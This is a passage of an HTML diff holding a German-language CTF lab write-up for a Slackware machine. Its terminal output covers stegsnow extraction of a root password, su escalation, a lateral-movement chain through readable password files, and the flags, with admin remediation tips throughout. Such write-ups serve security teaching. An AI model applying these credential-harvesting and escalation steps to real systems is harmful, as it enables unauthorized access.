+                <strong>Bewertung:</strong> Der `scp`-Befehl funktioniert und überträgt die Datei. `file` und `strings` zeigen die erwartete Flagge mit verräterischem zusätzlichem Leerraum (Whitespace). `stegsnow -C` extrahiert erfolgreich ein darin verstecktes Passwort: `<span class="password">To_Jest_Bardzo_Trudne_Haslo</span>` (Polnisch für "Das ist ein sehr schwieriges Passwort"). Dies ist die entscheidende Information für den Root-Zugriff.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende das extrahierte Passwort, um mit `su root` Root-Rechte zu erlangen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie keine Steganographie, um Passwörter oder sensible Daten zu verstecken, insbesondere nicht in Dateien, die Flags enthalten oder anderweitig zugänglich sind. Dies ist keine sichere Methode. Schulen Sie Benutzer darin, keine sensiblen Daten in scheinbar harmlosen Dateien zu verbergen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">scp -P 1 rpj7@192.168.2.107:/home/rpj7/user.txt ~</span> <!-- IP statt Hostname -->
+                     </div>
+                     <pre>
+ (rpj7@192.168.2.107) Password: <span class="command">wP26CtkDby6J</span>
+ user.txt                                                    100%  314   522.9KB/s   00:00
+                     </pre>
+                 </div>
+             </div>
+             <!-- ll output gekürzt -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">file user.txt</span>
+                    </div>
+                    <pre>
+user.txt: ASCII text
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">strings user.txt</span>
+                    </div>
+                    <pre>
+HMV{Th1s1s1Us3rFlag}	     	      	 	   	     	       	       <!-- Whitespace am Ende -->
+    	      		    	       			 	   	       <!-- Whitespace am Ende -->
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C user.txt</span>
+                    </div>
+                    <pre>
+<span class="password">To_Jest_Bardzo_Trudne_Haslo</span>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Von einer der Benutzer-Shells (hier als `skinny@slackware` gezeigt) wird `su root` ausgeführt und das via `stegsnow` extrahierte Passwort eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation zu Root erfolgreich!** Das Passwort ist korrekt und der Benutzer wechselt zu `root`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Maschine ist vollständig kompromittiert. Bestätige die Root-Flag im `/root`-Verzeichnis oder am zuvor gefundenen Ort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das Root-Passwort wurde kompromittiert. Ändern Sie es sofort. Untersuchen Sie, wie das Passwort in die Datei gelangt ist und beheben Sie die zugrundeliegende Schwachstelle (unsichere Speicherung, Steganographie). Führen Sie eine vollständige Systemprüfung durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <!-- Annahme: Aktueller User ist skinny -->
+skinny@slackware:~$ <span class="command">su root</span>
+                    </div>
+                    <pre>
+Password: <span class="command">To_Jest_Bardzo_Trudne_Haslo</span>
+root@slackware:/home/skinny#
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Proof of Concept Abschnitte -->
+        <section id="poc-access">
+            <h2>Proof of Concept (Initial Access & Lateral Movement)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser POC beschreibt den Weg zum initialen Zugriff als `patrick` und die anschließende laterale Bewegung durch die Benutzerkette.
+            </p>
+            <p>
+                <strong>Schwachstellen:</strong>
+                <ol>
+                    <li>Steganographie: Passwort (`trYth1sPasS1993`) in `twitter.png` versteckt, das aus einem öffentlich zugänglichen, mehrteiligen 7z-Archiv (`/getslack/twitter.7z.00*`) extrahiert wurde.</li>
+                    <li>SSH auf nicht standardmäßigem Port 1 aktiv.</li>
+                    <li>Fehlkonfigurierte Gruppenberechtigungen: Jeder Benutzer ist Mitglied der Gruppe des *nächsten* Benutzers in einer langen Kette.</li>
+                    <li>Unsichere Speicherung: Passwörter für Benutzer werden in Klartextdateien (`mypass.txt`) in deren Home-Verzeichnissen gespeichert, die für die Gruppe des *vorherigen* Benutzers lesbar sind.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion:</strong>
+                <ol>
+                    <li>Finde das Verzeichnis `/getslack/` auf `http://192.168.2.107:2`.</li>
+                    <li>Finde und lade alle Teile des Archivs `twitter.7z.00*` aus `/getslack/` herunter.</li>
+                    <li>Extrahiere das Archiv mit `7z x twitter.7z.001` -> ergibt `twitter.png`.</li>
+                    <li>Extrahiere das Passwort aus dem Bild: `strings twitter.png -n 12` -> ergibt `trYth1sPasS1993`.</li>
+                    <li>Melde dich per SSH auf Port 1 als `patrick` mit dem Passwort an: `ssh patrick@192.168.2.107 -p1`.</li>
+                    <li>Wechsle ins Verzeichnis `/home/claor/` (Gruppe `kretinga`, `patrick` ist Mitglied).</li>
+                    <li>Lese `/home/claor/mypass.txt` -> Passwort für `claor`.</li>
+                    <li>Werde zu `claor`: `su claor`.</li>
+                    <li>Wiederhole Schritte 6-8 für die Kette: `claor` (Gruppe `alienum`) -> `/home/alienum/mypass.txt` -> `su alienum` -> ... bis `rpj7`.</li>
+                    <li>Lese die User-Flag: `cat /home/rpj7/user.txt`.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Erfolgreicher SSH-Login als `patrick`, anschließende Übernahme der Konten bis `rpj7` und Auslesen der User-Flag.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die Berechtigungsprobleme der Home-Verzeichnisse und Gruppen. Entfernen Sie Klartext-Passwortdateien. Erzwingen Sie starke, einzigartige Passwörter. Überprüfen und korrigieren Sie die Methode, wie das Archiv `twitter.7z` zugänglich wurde und warum es ein Passwort enthielt.
+            </p>
+        </section>
+
+        <section id="poc-privesc">
+            <h2>Proof of Concept (Root Escalation via Steganography)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Dieser POC beschreibt den finalen Schritt zur Erlangung von Root-Rechten durch Ausnutzung von Steganographie in der User-Flag-Datei.
+            </p>
+             <p>
+                <strong>Schwachstelle:</strong> Das Root-Passwort ist mittels Whitespace-Steganographie in der User-Flag-Datei (`/home/rpj7/user.txt`) versteckt.
+            </p>
+            <p>
+                <strong>Voraussetzungen:</strong> Lesezugriff auf die Datei `/home/rpj7/user.txt` (erreicht durch die vorherige Lateral-Movement-Kette). Das Tool `stegsnow`.
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion:</strong>
+                <ol>
+                    <li>Nachdem Zugriff auf das Home-Verzeichnis von `rpj7` erlangt wurde (z.B. als Benutzer `b4el7d` oder `rpj7`), kopiere die Datei `user.txt` auf das Angreifer-System oder analysiere sie direkt.</li>
+                    <li>Verwende `stegsnow` um das versteckte Passwort zu extrahieren: `stegsnow -C user.txt` -> ergibt `To_Jest_Bardzo_Trudne_Haslo`.</li>
+                    <li>Verwende das extrahierte Passwort, um zu Root zu wechseln: `su root` (Passwort eingeben).</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Erfolgreicher Wechsel zum Root-Benutzer. Zugriff auf `/root/root.txt` oder `/home/0xh3rshel/.screenrc` zum Lesen der Root-Flag.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter (auch nicht versteckt) in Dateien. Ändern Sie das Root-Passwort. Stellen Sie sicher, dass keine sensiblen Daten durch Steganographie in scheinbar harmlosen Dateien verborgen sind. Überprüfen Sie die Integrität kritischer Systemdateien und Benutzerdateien.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/rpj7/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{Th1s1s1Us3rFlag}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <!-- Root-Flag wurde vor Root-Zugriff gefunden -->
+                    <div class="flag-command">cat /home/0xh3rshel/.screenrc</div>
+                    <div class="flag-value"><span class="password">HMV{SlackwareStillAlive}</span></div>
+                </div>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-04-25</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
